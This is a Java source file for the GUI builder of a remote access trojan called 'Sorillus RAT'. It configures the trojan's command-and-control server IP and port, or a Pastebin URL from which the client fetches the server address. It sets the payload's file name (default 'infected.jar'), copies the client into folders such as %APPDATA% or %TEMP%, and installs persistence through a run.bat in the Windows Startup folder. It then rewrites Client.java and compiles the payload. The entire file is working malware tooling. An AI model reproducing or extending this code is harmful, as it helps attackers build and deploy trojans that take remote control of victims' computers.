package com.sorillus.rat;

import com.formdev.flatlaf.FlatDarkLaf;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class BuilderWindow {
    private JFrame frame;
    private JTextField ipField;
    private JTextField portField;
    private JTextField pastebinField;
    private JTextField fileNameField;
    private JComboBox<String> copyPathComboBox;
    private JCheckBox usePastebinCheckBox;
    private JCheckBox autoStartCheckBox;
    private JCheckBox copyToFolderCheckBox;

    public BuilderWindow() {
        try {
            UIManager.setLookAndFeel(new FlatDarkLaf());
        } catch (Exception e) {
            System.err.println("Failed to set FlatLaf: " + e.getMessage());
        }

        frame = new JFrame("Sorillus RAT Builder");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        frame.setSize(500, 600);
        frame.setLayout(new BorderLayout(10, 10));
        frame.setResizable(false);

        JPanel mainPanel = new JPanel();
        mainPanel.setLayout(new BoxLayout(mainPanel, BoxLayout.Y_AXIS));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));

        JPanel serverPanel = new JPanel(new GridBagLayout());
        serverPanel.setBorder(BorderFactory.createTitledBorder("Server Settings"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        gbc.gridx = 0;
        gbc.gridy = 0;
        serverPanel.add(new JLabel("Server IP:"), gbc);
        gbc.gridx = 1;
        ipField = new JTextField("127.0.0.1", 20);
        serverPanel.add(ipField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        serverPanel.add(new JLabel("Port:"), gbc);
        gbc.gridx = 1;
        portField = new JTextField("1604", 20);
        serverPanel.add(portField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 2;
        serverPanel.add(new JLabel("Use Pastebin:"), gbc);
        gbc.gridx = 1;
        usePastebinCheckBox = new JCheckBox();
        usePastebinCheckBox.addActionListener(e -> {
            pastebinField.setEnabled(usePastebinCheckBox.isSelected());
            ipField.setEnabled(!usePastebinCheckBox.isSelected());
        });
        serverPanel.add(usePastebinCheckBox, gbc);

        gbc.gridx = 0;
        gbc.gridy = 3;
        serverPanel.add(new JLabel("Pastebin URL:"), gbc);
        gbc.gridx = 1;
        pastebinField = new JTextField("", 20);
        pastebinField.setEnabled(false);
        serverPanel.add(pastebinField, gbc);

        mainPanel.add(serverPanel);

        JPanel clientPanel = new JPanel(new GridBagLayout());
        clientPanel.setBorder(BorderFactory.createTitledBorder("Client Settings"));
        gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.fill = GridBagConstraints.HORIZONTAL;

        gbc.gridx = 0;
        gbc.gridy = 0;
        clientPanel.add(new JLabel("File Name:"), gbc);
        gbc.gridx = 1;
        fileNameField = new JTextField("infected.jar", 20);
        clientPanel.add(fileNameField, gbc);

        gbc.gridx = 0;
        gbc.gridy = 1;
        clientPanel.add(new JLabel("Add to Startup:"), gbc);
        gbc.gridx = 1;
        autoStartCheckBox = new JCheckBox();
        clientPanel.add(autoStartCheckBox, gbc);

        gbc.gridx = 0;
        gbc.gridy = 2;
        clientPanel.add(new JLabel("Copy to Folder:"), gbc);
        gbc.gridx = 1;
        copyToFolderCheckBox = new JCheckBox();
        copyToFolderCheckBox.addActionListener(e -> copyPathComboBox.setEnabled(copyToFolderCheckBox.isSelected()));
        clientPanel.add(copyToFolderCheckBox, gbc);

        gbc.gridx = 0;
        gbc.gridy = 3;
        clientPanel.add(new JLabel("Folder Path:"), gbc);
        gbc.gridx = 1;
        String[] paths = {
                "%TEMP%",           // C:\Users\<User>\AppData\Local\Temp
                "%APPDATA%",        // C:\Users\<User>\AppData\Roaming
                "%PROGRAMDATA%",    // C:\ProgramData
                "%USERPROFILE%",    // C:\Users\<User>
                "Custom Path..."    // Пользовательский путь
        };
        copyPathComboBox = new JComboBox<>(paths);
        copyPathComboBox.setEnabled(false);
        copyPathComboBox.setEditable(true);
        copyPathComboBox.addActionListener(e -> {
            if ("Custom Path...".equals(copyPathComboBox.getSelectedItem())) {
                JFileChooser chooser = new JFileChooser();
                chooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
                if (chooser.showOpenDialog(frame) == JFileChooser.APPROVE_OPTION) {
                    copyPathComboBox.setSelectedItem(chooser.getSelectedFile().getAbsolutePath());
                }
            }
        });
        clientPanel.add(copyPathComboBox, gbc);

        mainPanel.add(clientPanel);

        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
        JButton generateButton = new JButton("Generate Payload");
        generateButton.setPreferredSize(new Dimension(150, 40));
        generateButton.addActionListener(e -> generatePayload());
        buttonPanel.add(generateButton);

        frame.add(mainPanel, BorderLayout.CENTER);
        frame.add(buttonPanel, BorderLayout.SOUTH);

        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    private void generatePayload() {
        String ip = ipField.getText().trim();
        String port = portField.getText().trim();
        String pastebin = pastebinField.getText().trim();
        String fileName = fileNameField.getText().trim();
        String copyPath = copyPathComboBox.getSelectedItem().toString().trim();
        boolean usePastebin = usePastebinCheckBox.isSelected();
        boolean autoStart = autoStartCheckBox.isSelected();
        boolean copyToFolder = copyToFolderCheckBox.isSelected();

        if (!usePastebin && ip.isEmpty()) {
            JOptionPane.showMessageDialog(frame, "Please provide a Server IP!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        if (usePastebin && pastebin.isEmpty()) {
            JOptionPane.showMessageDialog(frame, "Please provide a Pastebin URL!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        if (port.isEmpty()) {
            JOptionPane.showMessageDialog(frame, "Please provide a port number!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        if (fileName.isEmpty()) {
            JOptionPane.showMessageDialog(frame, "Please provide a file name!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        if (copyToFolder && copyPath.isEmpty()) {
            JOptionPane.showMessageDialog(frame, "Please provide a folder path for copying!", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        int portNumber;
        try {
            portNumber = Integer.parseInt(port);
            if (portNumber < 1 || portNumber > 65535) {
                throw new NumberFormatException("Port must be between 1 and 65535");
            }
        } catch (NumberFormatException e) {
            JOptionPane.showMessageDialog(frame, "Invalid port number: " + e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            return;
        }

        try {
            // Передаём информацию о копировании в Client.java
            updateClientFile(ip, portNumber, pastebin, usePastebin, copyToFolder, copyPath);
            boolean compiledWithMaven = compileWithMaven();
            if (!compiledWithMaven) {
                compileWithJavac();
            }
            Builder.generate(fileName);

            // Добавление в автозагрузку
            if (autoStart) {
                String startupPath = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
                File startupDir = new File(startupPath);
                if (!startupDir.exists()) {
                    startupDir.mkdirs();
                }
                File sourceFile = new File(getProjectRoot() + "/" + fileName);
                File batFile = new File(startupDir, "run.bat");
                try (BufferedWriter writer = new BufferedWriter(new FileWriter(batFile))) {
                    writer.write("@echo off\n");
                    writer.write("javaw -jar \"" + sourceFile.getAbsolutePath() + "\"\n");
                }
            }

            JOptionPane.showMessageDialog(frame, "Payload generated: " + fileName, "Success", JOptionPane.INFORMATION_MESSAGE);
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(frame, "Error generating payload: " + ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void updateClientFile(String ip, int port, String pastebin, boolean usePastebin, boolean copyToFolder, String copyPath) throws IOException {
        String projectRoot = getProjectRoot();
        File clientFile = new File(projectRoot + "/src/main/java/com/sorillus/rat/Client.java");

        if (!clientFile.exists()) {
            throw new IOException("Client.java not found at: " + clientFile.getAbsolutePath());
        }

        StringBuilder content = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new FileReader(clientFile))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("String serverIP =")) {
                    if (!usePastebin) {
                        line = "            String serverIP = \"" + ip + "\"; // Local IP for testing";
                    } else {
                        line = "            String serverIP = \"\"; // Will be loaded from Pastebin";
                    }
                }
                if (line.contains("int port =")) {
                    line = "            int port = " + port + ";";
                }
                if (line.contains("String pastebinUrl =")) {
                    line = "            String pastebinUrl = \"" + pastebin + "\"; // Will be replaced by BuilderWindow";
                }
                if (line.contains("boolean COPY_TO_FOLDER =")) {
                    line = "    private static final boolean COPY_TO_FOLDER = " + copyToFolder + "; // Set by BuilderWindow";
                }
                if (line.contains("String COPY_PATH =")) {
                    line = "    private static final String COPY_PATH = \"" + copyPath + "\"; // Set by BuilderWindow";
                }
                content.append(line).append("\n");
            }
        }

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(clientFile))) {
            writer.write(content.toString());
        }
    }

    private String resolvePath(String path) {
        if (path.equals("%TEMP%")) {
            return System.getenv("TEMP");
        } else if (path.equals("%APPDATA%")) {
            return System.getenv("APPDATA");
        } else if (path.equals("%PROGRAMDATA%")) {
            return System.getenv("PROGRAMDATA");
        } else if (path.equals("%USERPROFILE%")) {
            return System.getProperty("user.home");
        }
        return path;
    }

    private boolean compileWithMaven() throws IOException, InterruptedException {
        String projectRoot = getProjectRoot();
        ProcessBuilder processBuilder = new ProcessBuilder("cmd.exe", "/c", "mvn.cmd", "compile");
        processBuilder.directory(new File(projectRoot));
        Process process = processBuilder.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        while ((line = errorReader.readLine()) != null) {
            System.err.println(line);
        }

        int exitCode = process.waitFor();
        return exitCode == 0;
    }

    private void compileWithJavac() throws IOException, InterruptedException {
        String projectRoot = getProjectRoot();
        String srcPath = projectRoot + "/src/main/java/com/sorillus/rat/Client.java";
        String targetPath = projectRoot + "/target/classes";

        new File(targetPath).mkdirs();

        ProcessBuilder processBuilder = new ProcessBuilder(
                "javac",
                "-d", targetPath,
                srcPath
        );
        processBuilder.directory(new File(projectRoot));
        Process process = processBuilder.start();

        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            System.out.println(line);
        }
        while ((line = errorReader.readLine()) != null) {
            System.err.println(line);
        }

        int exitCode = process.waitFor();
        if (exitCode != 0) {
            throw new IOException("Failed to compile Client.java with javac. Exit code: " + exitCode);
        }
    }

    private String getProjectRoot() {
        String currentDir = System.getProperty("user.dir");
        if (currentDir.endsWith("target")) {
            return new File(currentDir).getParent();
        }
        return currentDir;
    }
}